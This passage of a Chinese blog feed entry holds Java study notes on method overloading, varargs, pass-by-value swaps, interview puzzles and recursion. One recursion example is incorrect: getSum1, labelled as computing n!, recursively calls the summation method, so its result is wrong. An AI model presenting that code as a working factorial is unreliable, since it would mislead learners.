id="2-举例：Arrays-类中重载的-sort-binarySearch"><a href="#2-举例：Arrays-类中重载的-sort-binarySearch" class="headerlink" title="2. 举例：Arrays 类中重载的 sort() &#x2F; binarySearch()"></a>2. 举例：Arrays 类中重载的 sort() &#x2F; binarySearch()</h3><h3 id="3-判断是否是重载：跟方法的权限修饰符、返回值类型、形参变量名、方法体都没有关系！"><a href="#3-判断是否是重载：跟方法的权限修饰符、返回值类型、形参变量名、方法体都没有关系！" class="headerlink" title="3. 判断是否是重载：跟方法的权限修饰符、返回值类型、形参变量名、方法体都没有关系！"></a>3. 判断是否是重载：跟方法的权限修饰符、返回值类型、形参变量名、方法体都没有关系！</h3><h3 id="4-在通过对象调用方法时，通过方法名和参数列表确定方法"><a href="#4-在通过对象调用方法时，通过方法名和参数列表确定方法" class="headerlink" title="4. 在通过对象调用方法时，通过方法名和参数列表确定方法"></a>4. 在通过对象调用方法时，通过方法名和参数列表确定方法</h3><h3 id="5-java-代码"><a href="#5-java-代码" class="headerlink" title="5. java 代码"></a>5. java 代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 方法的重载</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-12 13:56</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OverLoadTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">OverLoadTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OverLoadTest</span>();</span><br><span class="line">        test.getSum(<span class="number">1</span>, <span class="number">2</span>);      <span class="comment">//1</span></span><br><span class="line">        test.getSum(<span class="number">1.0</span>, <span class="number">2.0</span>);         <span class="comment">//2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果没有这个方法，则提升为double的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getSum</span><span class="params">(<span class="type">double</span> d1, <span class="type">double</span> d2)</span>&#123;</span><br><span class="line">        System.out.println(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//传参数有顺序要求，顺序不一样也重载</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getSum</span><span class="params">(String s ,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">        System.out.println(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> i,String s)</span>&#123;</span><br><span class="line">        System.out.println(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    如下的3个方法不能与上述4个方法构成重载</span></span><br><span class="line"><span class="comment">    跟方法的权限修饰符、返回值类型、形参变量名、方法体都没有关系</span></span><br><span class="line"><span class="comment">    public int getSum(int i,int j)&#123;</span></span><br><span class="line"><span class="comment">        return 0;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    public void getSum(int m,int n)&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    private void getSum(int i,int j)&#123;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="6-可变个数形参的方法"><a href="#6-可变个数形参的方法" class="headerlink" title="6. 可变个数形参的方法"></a>6. 可变个数形参的方法</h2><ol><li>可变个数形参的格式：数据类型 … 变量名</li><li>当调用可变个数形参的方法时，传入的参数个数可以是：0 个，1 个,2 个，。。。</li><li>可变个数形参的方法与本类中方法名相同，形参不同的方法之间构成重载</li><li>可变个数形参的方法与本类中方法名相同，形参类型也相同的数组之间不构成重载。</li><li>可变个数形参在方法的形参中，必须声明在末尾</li><li>可变个数形参在方法的形参中,最多只能声明一个可变形参。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 可变个数形参的方法</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-13 20:51</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodArgsTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">MethodArgsTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodArgsTest</span>();</span><br><span class="line">        test.show(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">        test.show(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;AA&quot;</span>, <span class="string">&quot;BB&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">(String s)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;String s&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">(String ... strings)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;String ... strings&quot;</span>);</span><br><span class="line">        System.out.println(Arrays.toString(strings));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//不能与上一个方法同时存在</span></span><br><span class="line"><span class="comment">//    public void show(String[] strs)&#123;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="7-关于变量的赋值"><a href="#7-关于变量的赋值" class="headerlink" title="7. 关于变量的赋值"></a>7. 关于变量的赋值</h2><ol><li>基本数据类型，此时赋值的是变量所保存的数据值。</li><li>引用数据类型，此时赋值的是变量所保存的数据的地址值。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 关于变量的赋值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-13 22:41</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ValueTransferTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> m;</span><br><span class="line">        System.out.println(m + <span class="string">&quot;\t&quot;</span>+ n);</span><br><span class="line"></span><br><span class="line">        n = <span class="number">20</span>;</span><br><span class="line">        System.out.println(m + <span class="string">&quot;\t&quot;</span>+ n);</span><br><span class="line"></span><br><span class="line">        <span class="type">Order</span> <span class="variable">o1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Order</span>();</span><br><span class="line">        o1.orderId = <span class="number">1001</span>;</span><br><span class="line">        <span class="type">Order</span> <span class="variable">o2</span> <span class="operator">=</span> o1;<span class="comment">//赋值以后，o1和o2的地址值相同</span></span><br><span class="line">        System.out.println(o1.orderId + <span class="string">&quot;\t&quot;</span> + o2.orderId);</span><br><span class="line"></span><br><span class="line">        o2.orderId = <span class="number">1002</span>;</span><br><span class="line">        System.out.println(o1.orderId + <span class="string">&quot;\t&quot;</span> + o2.orderId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Order</span>&#123;</span><br><span class="line">    <span class="type">int</span> orderId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 方法的形参的传递机制：值传递</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-13 23:12</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ValueTransferTest1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line">        System.out.println(m + <span class="string">&quot;\t&quot;</span> + n);       <span class="comment">//10    20</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ValueTransferTest1</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValueTransferTest1</span>();</span><br><span class="line">        test.swap(m, n);</span><br><span class="line">        System.out.println(m + <span class="string">&quot;\t&quot;</span> + n);       <span class="comment">//10    20</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> m, <span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> m;</span><br><span class="line">        m = n;</span><br><span class="line">        n = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 实现交换</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-13 23:40</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ValueTransferTest2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Data</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Data</span>();</span><br><span class="line">        data.m = <span class="number">10</span>;</span><br><span class="line">        data.n = <span class="number">20</span>;</span><br><span class="line">        System.out.println(data.m + <span class="string">&quot;\t&quot;</span> + data.n);    <span class="comment">//10    20</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ValueTransferTest2</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ValueTransferTest2</span>();</span><br><span class="line">        test.swap(data);</span><br><span class="line">        System.out.println(data.m + <span class="string">&quot;\t&quot;</span> + data.n);    <span class="comment">//20    10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(Data data)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> data.m;</span><br><span class="line">        data.m = data.n;</span><br><span class="line">        data.n = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Data</span>&#123;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-面试题"><a href="#8-面试题" class="headerlink" title="8. 面试题"></a>8. 面试题</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 面试坑1</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-14 23:34</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        method(a, b);       <span class="comment">//仅输出a = 100,b = 200</span></span><br><span class="line">        System.out.println(<span class="string">&quot;a=&quot;</span> + a);</span><br><span class="line">        System.out.println(<span class="string">&quot;b=&quot;</span> + b);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span>&#123;</span><br><span class="line">        <span class="comment">//自己编写</span></span><br><span class="line">        a = a * <span class="number">10</span>;</span><br><span class="line">        b = b * <span class="number">20</span>;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        System.exit(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 面试坑2</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-14 23:39</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line">        System.out.println(arr);        <span class="comment">//地址值</span></span><br><span class="line">        <span class="type">char</span>[] arr1 = <span class="keyword">new</span> <span class="title class_">char</span>[]&#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line">        System.out.println(arr1);       <span class="comment">//abc</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="9-递归"><a href="#9-递归" class="headerlink" title="9. 递归"></a>9. 递归</h2><ol><li>递归方法：一个方法体内调用它自身。</li><li>方法递归包含了一种隐式的循环，它会重复执行某段代码，但这种重复执行无须循环控制。<br>递归一定要向已知方向递归，否则这种递归就变成了无穷递归，类似于死循环。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.java1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: project10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 递归</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: kkx</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2021-12-17 00:35</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RecursionTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 例1：计算1-100之间所有自然数的和</span></span><br><span class="line">        <span class="comment">// 方式一：</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100</span>; i++) &#123;</span><br><span class="line">            sum += i;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(sum);</span><br><span class="line">        <span class="comment">// 方式二：</span></span><br><span class="line">        <span class="type">RecursionTest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RecursionTest</span>();</span><br><span class="line">        System.out.println(test.getSum1(<span class="number">100</span>));</span><br><span class="line">        System.out.println(test.f(<span class="number">10</span>));</span><br><span class="line">        System.out.println(test.fibonacci(<span class="number">10</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 例1：计算1-n之间所有自然数的和</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> n + getSum(n - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 例2：计算1-n之间所有自然数的乘积:n!</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSum1</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> n * getSum(n - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//例3：已知有一个数列：f(0) = 1,f(1) = 4,f(n+2)=2*f(n+1) + f(n),</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * f(n - <span class="number">1</span>) + f(n - <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//例4：斐波那契数列</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fibonacci</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> fibonacci(n - <span class="number">1</span>) + fibonacci(n - <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//例5：汉诺塔问题</span></span><br><span class="line">    <span class="comment">//例6：快排</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-理解“万事万物皆对象”&quot;&gt;&lt;a href=&quot;#1-理解“万事万物皆对象”&quot; class=&quot;headerlink&quot; title=&quot;1. 理解“万事万物皆对象”&quot;&gt;&lt;/a&gt;1. 理解“万事万物皆对象”&lt;/h2&gt;&lt;h3 id=&quot;1-在-Java-语言范畴中，我们都将</summary>
      
    
    
    
    <category term="Java学习笔记" scheme="https://www.bandao.ltd/categories/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Java" scheme="https://www.bandao.ltd/tags/Java/"/>
    
    <category term="学习笔记" scheme="https://www.bandao.ltd/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="基础" scheme="https://www.bandao.ltd/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="类" scheme="https://www.bandao.ltd/tags/%E7%B1%BB/"/>
    
  </entry>
  
  <entry>
    <title>java学习笔记9</title>
    <link href="https://www.bandao.ltd/coding/java/note/9.html"/>
    <id>https://www.bandao.ltd/coding/java/note/9.html</id>
    <published>2021-12-12T04:52:00.000Z</published>
    <updated>2024-11-09T09:13:00.491Z</updated>
    
